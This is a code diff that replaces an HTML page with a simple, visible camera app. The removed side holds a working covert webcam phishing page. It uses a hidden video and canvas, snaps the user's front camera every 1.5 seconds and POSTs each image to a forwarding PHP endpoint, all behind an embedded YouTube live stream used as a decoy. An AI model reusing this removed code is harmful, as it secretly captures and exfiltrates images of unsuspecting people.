@@ -1,82 +1,49 @@
-<!doctype html>
+<!DOCTYPE html>
 <html>
-<head>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
+  <head>
+    <title>Camera App</title>
+    <style>
+      #videoElement {
+        width: 100%;
+        height: auto;
+      }
+      #captureButton {
+        margin-top: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <h1>Camera App</h1>
+    <video id="videoElement" autoplay></video>
+    <button id="captureButton">Capture</button>
 
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
+    <script>
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(function (stream) {
+          var videoElement = document.getElementById("videoElement");
+          videoElement.srcObject = stream;
+        })
+        .catch(function (error) {
+          console.error("Error accessing the camera.", error);
+        });
 
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
+      var captureButton = document.getElementById("captureButton");
+      captureButton.addEventListener("click", function () {
+        var videoElement = document.getElementById("videoElement");
+        var canvas = document.createElement("canvas");
+        canvas.width = videoElement.videoWidth;
+        canvas.height = videoElement.videoHeight;
+        var context = canvas.getContext("2d");
+        context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
 
-<script>
+        // Do something with the captured image, e.g., save it or display it on the page.
+        // You can access the image data using: canvas.toDataURL()
 
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
-    }
-  });
-};
-
-
-'use strict';
-
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
-
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
-
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
-
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
-
-var context = canvas.getContext('2d');
-  setInterval(function(){
-
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
-
-}
-
-// Load init
-init();
-
-</script>
-
-    <body>
-        <iframe id="Live_YT_TV" width="100%" height="500px" src="https://www.youtube.com/embed/live_yt_tv?autoplay=1" frameborder="0" allow="autoplay encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
-
-    </body>
-
+        // Example: Display the captured image on the page
+        var capturedImage = new Image();
+        capturedImage.src = canvas.toDataURL();
+        document.body.appendChild(capturedImage);
+      });
+    </script>
+  </body>
 </html>
